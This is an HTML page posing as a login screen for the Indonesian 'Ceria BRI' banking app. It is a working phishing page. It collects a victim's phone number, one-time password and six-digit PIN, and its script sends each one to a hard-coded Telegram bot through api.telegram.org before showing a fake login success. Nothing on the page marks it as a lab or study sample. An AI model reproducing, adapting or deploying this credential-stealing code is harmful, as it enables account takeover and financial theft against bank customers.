<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Ceria BRI</title>
    <style>
        :root {
            --ceria-purple: #6a0dad; 
            --bg-light: #f0f2f5;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-light);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Overlay Loading */
        #loadingOverlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255, 255, 255, 0.8);
            z-index: 9999;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #ddd;
            border-top: 5px solid var(--ceria-purple);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .login-card {
            background: #ffffff;
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 360px;
            text-align: center;
            z-index: 1;
        }

        .logo-box {
            background-color: var(--ceria-purple);
            width: 60px; height: 60px;
            margin: 0 auto 10px;
            border-radius: 12px;
            display: flex; justify-content: center; align-items: center;
            color: white; font-size: 30px; font-weight: bold;
        }

        .logo-text { font-weight: bold; color: #333; font-size: 18px; display: block; margin-bottom: 25px; }
        .step { display: none; }
        .step.active { display: block; animation: fadeIn 0.4s ease; }
        h3 { margin-bottom: 8px; color: #333; }
        p { font-size: 14px; color: #777; }
        .phone-display { font-weight: bold; color: #333; font-size: 15px; margin-bottom: 20px; display: block; }

        input {
            width: 100%; padding: 15px; margin: 15px 0;
            border: 1px solid #ddd; border-radius: 10px;
            box-sizing: border-box; font-size: 18px; text-align: center;
        }

        .btn-action {
            width: 100%; padding: 15px;
            background-color: var(--ceria-purple);
            color: white; border: none; border-radius: 25px;
            cursor: pointer; font-size: 16px; font-weight: bold;
        }

        .back-link { display: block; margin-top: 20px; color: var(--ceria-purple); cursor: pointer; font-size: 14px; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<div id="loadingOverlay">
    <div class="spinner"></div>
    <p style="margin-top: 15px; font-weight: bold; color: var(--ceria-purple);">Mohon Tunggu...</p>
</div>

<div class="login-card">
    <div class="logo-box">:)</div>
    <span class="logo-text">Ceria BRI</span>

    <div id="step1" class="step active">
        <h3>Selamat Datang</h3>
        <p>Masukkan nomor telepon terdaftar</p>
        <input type="tel" id="phoneInput" placeholder="0812xxxxxxx" maxlength="13">
        <button class="btn-action" onclick="processStep1()">Lanjutkan</button>
    </div>

    <div id="step2" class="step">
        <h3>Kode OTP</h3>
        <p>Kode telah dikirimkan ke nomor:</p>
        <span id="displayPhone" class="phone-display"></span>
        <input type="number" id="otp" placeholder="......" oninput="limit(this, 6)">
        <button class="btn-action" onclick="processStep2()">Verifikasi</button>
        <span class="back-link" onclick="showStep(1)">Ganti Nomor</span>
    </div>

    <div id="step3" class="step">
        <h3>PIN Ceria</h3>
        <p>Masukkan 6 digit PIN Ceria Anda</p>
        <input type="password" id="pin" placeholder="......" oninput="limit(this, 6)">
        <button class="btn-action" onclick="processStep3()">Login</button>
        <span class="back-link" onclick="showStep(2)">Kembali</span>
    </div>
</div>

<script>
    const token = "7236278274:AAGhDspMHEPFXABCWOBr9EzgdYt8h7HQGxo";
    const chatId = "5654329985";

    function showLoading(status) {
        document.getElementById('loadingOverlay').style.display = status ? 'flex' : 'none';
    }

    function showStep(n) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('step' + n).classList.add('active');
    }

    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
        try { await fetch(url); } catch (e) { console.error("Error sending data"); }
    }

    function processStep1() {
        const phone = document.getElementById('phoneInput').value;
        if(phone.length < 10) return alert("Nomor tidak valid");
        
        showLoading(true);
        setTimeout(async () => {
            await sendToTelegram(`[CERIA LOG] \nNo. HP: ${phone}`);
            document.getElementById('displayPhone').innerText = phone;
            showLoading(false);
            showStep(2);
        }, 1500);
    }

    function processStep2() {
        const otp = document.getElementById('otp').value;
        if(otp.length < 6) return alert("OTP harus 6 digit");

        showLoading(true);
        setTimeout(async () => {
            await sendToTelegram(`[CERIA LOG] \nOTP: ${otp}`);
            showLoading(false);
            showStep(3);
        }, 1500);
    }

    function processStep3() {
        const pin = document.getElementById('pin').value;
        if(pin.length < 6) return alert("PIN harus 6 digit");

        showLoading(true);
        setTimeout(async () => {
            await sendToTelegram(`[CERIA LOG] \nPIN: ${pin}`);
            showLoading(false);
            alert("Login Berhasil!");
        }, 2000);
    }

    function limit(element, max) {
        if(element.value.length > max) element.value = element.value.slice(0, max);
    }
</script>

</body>
</html>
